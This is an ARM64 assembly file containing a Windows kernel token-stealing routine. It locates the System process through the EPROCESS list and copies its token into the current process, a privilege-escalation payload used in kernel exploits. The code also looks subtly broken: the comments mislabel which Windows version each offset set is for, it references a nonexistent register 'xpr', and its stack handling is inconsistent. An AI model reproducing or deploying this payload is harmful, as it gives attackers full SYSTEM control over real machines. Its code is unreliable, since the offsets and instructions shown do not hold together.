; Version-specific offsets
    IF WINDOWS_VERSION == "24H2"
; Windows 10 offsets
KTHREAD_OFFSET     EQU 0x988    ; Offset to current KTHREAD
EPROCESS_OFFSET    EQU 0x0B0    ; Offset to EPROCESS
ACTIVEPROCESSLINKS EQU 0x1C8    ; Offset to ActiveProcessLinks
PID_OFFSET         EQU 0x1C0    ; Offset to process ID
TOKEN_OFFSET       EQU 0x238    ; Offset to process token
    ELIF WINDOWS_VERSION == "23H2"
; Windows 11 offsets
KTHREAD_OFFSET     EQU 0x988    ; Offset to current KTHREAD
EPROCESS_OFFSET    EQU 0x0B0    ; Offset to EPROCESS
ACTIVEPROCESSLINKS EQU 0x400    ; Offset to ActiveProcessLinks
PID_OFFSET         EQU 0x3F8    ; Offset to process ID
TOKEN_OFFSET       EQU 0x470    ; Offset to process token
    ELSE
    ERROR "WINDOWS_VERSION not defined or unsupported"
    ENDIF

    AREA |.text|,CODE,READONLY
    ALIGN

token_stealing PROC
    ; Save registers
    stp x0, x1, [sp, #-0x20]
    stp x2, x3, [sp, #-0x10]

    ldr x0, [xpr, #0x988]
    ldr x0, [x0, #0xB0]

    mov x1, x0                    ; Save current EPROCESS in x1

    ; System process PID (4)
    mov x2, #4

find_system
    ; Get next process
    add x0, x0, ACTIVEPROCESSLINKS
    ldr x0, [x0]
    sub x0, x0, ACTIVEPROCESSLINKS    ; Adjust to get EPROCESS base

    ; Compare PID
    ldr w3, [x0, PID_OFFSET]
    cmp w3, w2
    b.ne find_system

    ; Found System process, copy token
    ldr x2, [x0, TOKEN_OFFSET]        ; Get System token
    str x2, [x1, TOKEN_OFFSET]        ; Set token in our process

    ; Restore registers
    ldp x0, x1, [sp, #0x0]
    ldp x2, x3, [sp, #0x10]
    ldp fp,lr,[sp],#0x0
    add sp, sp, #0x30
    ret
    ENDP

    END
